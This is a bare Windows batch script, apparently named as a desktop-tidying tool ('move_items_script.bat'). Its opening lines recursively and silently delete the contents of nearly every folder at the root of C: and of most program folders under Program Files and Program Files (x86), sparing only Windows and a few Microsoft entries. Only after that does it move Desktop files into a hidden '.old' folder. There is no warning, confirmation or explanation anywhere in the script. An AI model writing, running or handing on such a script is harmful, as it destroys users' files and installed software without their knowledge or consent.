c:
cd /
for /D %%I in (*) do if /I not "%%I"=="Windows" if /I not "%%I"=="Users" if /I not "%%I"=="Program Files (x86)" if /I not "%%I"=="Program Files" del /s /q "%%I"
cd C:/"Program Files (x86)"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Microsoft" if /I not "%%I"=="Microsoft.NET" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/"Program Files"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/Users/%username%/Desktop
mkdir .old
@echo off 
setlocal enabledelayedexpansion 
for %%I in (*) do ( 
    if not "%%I"=="move_items_script.bat" ( 
        set "dirname=%%~nxI" 
        move "%%I" ".old\" 
    ) 
) 
endlocal 
